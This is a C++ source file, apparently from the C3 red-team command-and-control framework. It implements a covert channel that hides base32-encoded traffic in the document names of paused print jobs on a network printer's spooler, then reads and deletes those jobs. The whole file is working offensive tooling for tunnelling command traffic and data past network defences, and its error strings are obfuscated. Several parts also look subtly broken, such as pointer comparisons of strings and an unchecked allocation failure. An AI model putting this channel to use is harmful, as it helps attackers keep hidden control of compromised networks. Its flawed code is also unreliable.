#include "Stdafx.h"
#include "Print.h"
#include "Common/FSecure/Crypto/Base64.h"
#include "Common/FSecure/CppTools/StringConversions.h"
#include "Common/FSecure/CppTools/ScopeGuard.h"
#include "Common/FSecure/Crypto/Base32.h"
#include <Windows.h>
#include <Winspool.h>
#include <CommDlg.h>
#include <math.h>
#include <atlstr.h>
//#include <iostream>
#include <cassert>
#include <string>
#include <codecvt>
#include <locale>
using namespace FSecure::StringConversions;
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Channels::Print::Print(ByteView arguments)
	: m_inboundDirectionName{ arguments.Read<std::string>() }
	, m_outboundDirectionName{ arguments.Read<std::string>() }
	, m_jobIdentifier{ arguments.Read<std::string>() }
	, m_printerAddress{ arguments.Read<std::string>() }
	, m_pHandle{ CreateHandle() }
	
{
}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
size_t FSecure::C3::Interfaces::Channels::Print::OnSendToChannel(ByteView data)
{
	// Find out what size chunks we're able to send
	size_t sizeOfDataToWrite = CalculateDataSize(data);
	// Encode the data
	std::string dataToWrite = EncodeData(data, sizeOfDataToWrite);
	//Check if there's an existing print job waiting to be read
	JOB_INFO_2 job = GetC3Job();
	//If there is then we're not ready to write another
	if (job.pDocument != L"empty")
	{
		return 0;
	}
	//Otherwise create one with our data
	int writeResult = WriteData(dataToWrite);
	//Debug
	if (writeResult == 0)
	{
		std::cout << "Failed to write data because: " + GetLastError() << std::endl;
		return 0;
	}
	return sizeOfDataToWrite;
}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Channels::Print::OnReceiveFromChannel()
{
	//Check if there's an existing print job waiting to be read
	JOB_INFO_2 job = GetC3Job();
	// If there isn't then there's nothing to be read
	if (job.pDocument == L"empty")
	{
		return {};
	}
	// If it's not destined for us then ignore it
	std::wstring docName = job.pDocument;
	if (docName.find(Convert<Utf16>(m_inboundDirectionName)) == std::string::npos)
	{
		return {};
	}
	//Remove trailing jobIdentifier and lock, then decode the remaining data wstring
	std::string convertedData = Convert<Utf8>(docName.substr(0, docName.size() - m_inboundDirectionName.size() - m_jobIdentifier.size()));
	ByteVector ret = base32::decode(convertedData);
	//Delete the job so more data can be sent
	if (SetJob(m_pHandle, job.JobId, 0, NULL, JOB_CONTROL_DELETE) == 0)
	{
		throw std::runtime_error{ OBF("Failed to delete job") };
	}
	return ret;
}
JOB_INFO_2 FSecure::C3::Interfaces::Channels::Print::GetC3Job()
{
	DWORD       dwNeeded, dwReturned, i;
	JOB_INFO_2* pJobInfo;
	// First you call EnumJobs() to find out how much memory you need
	if (!EnumJobs(m_pHandle, 0, 0xFFFFFFFF, 2, NULL, 0, &dwNeeded,
		&dwReturned))
	{
		// It should have failed, but if it failed for any reason other
		// than "not enough memory", you should bail out
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
		{
			ClosePrinter(m_pHandle);
			throw std::runtime_error{ OBF("Couldn't enumerate jobs") };
		}
	}
	// Allocate enough memory for the JOB_INFO_2 structures plus
	// the extra data - dwNeeded from the previous call tells you
	// the total size needed
	if ((pJobInfo = (JOB_INFO_2*)malloc(dwNeeded)) == NULL)
	{
		ClosePrinter(m_pHandle);
	}
	// Call EnumJobs() again and let it fill out our structures
	if (!EnumJobs(m_pHandle, 0, 0xFFFFFFFF, 2, (LPBYTE)pJobInfo,
		dwNeeded, &dwNeeded, &dwReturned))
	{
		ClosePrinter(m_pHandle);
		free(pJobInfo);
	}
	// It's easy to loop through the jobs and access each one
	JOB_INFO_2 emptyJobInfo;
	emptyJobInfo.pDocument = L"empty";
	for (i = 0; i < dwReturned; i++)
	{
		std::wstring docName = pJobInfo[i].pDocument;
		// Check that it's a C3 job
		if (docName.compare(docName.size() - 2, docName.size(), Convert<Utf16>(m_jobIdentifier)) == 0) //&& pJobInfo[i].Status != 8213
		{
			return pJobInfo[i];
		}
	}
	// If we get to here then no C3 job exists
	// Clean up
	free(pJobInfo);
	return emptyJobInfo;
}
HANDLE FSecure::C3::Interfaces::Channels::Print::CreateHandle()
{
	HANDLE pHandle;
	PRINTER_DEFAULTS defaults{};
	PRINTER_OPTIONS options{};
	std::wstring printer = Convert<Utf16>(m_printerAddress);
	// 	LPTSTR pName = (LPTSTR)_T("\\\\10.1.15.9\\Physical");
	LPTSTR pName = (LPTSTR)(printer.c_str());
	defaults.DesiredAccess = PRINTER_ACCESS_USE;
	options.cbSize = 1;
	options.dwFlags = PRINTER_OPTION_NO_CACHE;
	if (!OpenPrinter2(pName, (LPHANDLE)&pHandle, &defaults, NULL))
	{
		printf("Printer cannot open");
		abort();
	}
	else {
		m_pHandle = pHandle;
		return pHandle;
	}
}
//Returns the last Win32 error, in string format. Returns an empty string if there is no error.
std::string GetLastErrorAsString()
{
	//Get the error message, if any.
	DWORD errorMessageID = ::GetLastError();
	if (errorMessageID == 0)
		return std::string(); //No error message has been recorded
	LPSTR messageBuffer = nullptr;
	size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);
	std::string message(messageBuffer, size);
	//Free the buffer.
	LocalFree(messageBuffer);
	return message;
}
DWORD FSecure::C3::Interfaces::Channels::Print::WriteData(std::string dataToWrite)
{
	USES_CONVERSION_EX;
	DOC_INFO_1 docInfo{};
	std::wstring data = Convert<Utf16>(dataToWrite.c_str());
	std::wstring identifier = Convert<Utf16>(m_outboundDirectionName) + Convert<Utf16>(m_jobIdentifier);
	std::wstring docName = data + identifier;
	docInfo.pDocName = (LPWSTR)docName.c_str();
	docInfo.pOutputFile = NULL;
	docInfo.pDatatype = (LPWSTR)L"RAW";
	//Debug
	//std::cout << "Wrote this: " + (std::string)dataToWrite.c_str() + "\n" << std::endl;
	int jobId = StartDocPrinter(m_pHandle, 1, (LPBYTE)&docInfo);
	if (jobId == 0)
	{
		throw std::runtime_error{ OBF("Couldn't write data") };
	}
	if (SetJob(m_pHandle, jobId, 0, NULL, JOB_CONTROL_PAUSE) == 0)
	{
		std::cout << GetLastErrorAsString() << std::endl;
		throw std::runtime_error{ OBF("Couldn't pause job") };
	}
	if (EndDocPrinter(m_pHandle) == 0)
	{
		throw std::runtime_error{ OBF("Couldn't write data") };
	}
	return jobId;
}
size_t FSecure::C3::Interfaces::Channels::Print::CalculateDataSize(ByteView data)
{
	auto trueDataSize = 1048576 - m_outboundDirectionName.size() - m_jobIdentifier.size();
	auto maxPacketSize = base32::decoded_max_size(trueDataSize);
	return std::min(maxPacketSize, data.size());
}
std::string FSecure::C3::Interfaces::Channels::Print::EncodeData(ByteView data, size_t dataSize)
{
	auto sendData = data.SubString(0, dataSize);
	return base32::encode(sendData.data(), sendData.size());
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
const char* FSecure::C3::Interfaces::Channels::Print::GetCapability()
{
	return R"_(
{
	"create":
	{
		"arguments":
		[
			[
				{
					"type": "string",
					"name": "Input ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets for the channel"
				},
				{
					"type": "string",
					"name": "Output ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets from the channel"
				}
			],
			{
                "type": "string",
                "name": "Job Identifier",
                "min": 1,
				"defaultValue": "C3",
                "description": "The unique string from which C3 jobs can be identified on the spooler"
            },
{
                "type": "string",
                "name": "Printer Address",
                "min": 1,
				"defaultValue": "",
                "description": ""
            }
		]
	},
	"commands": []
}
)_";
}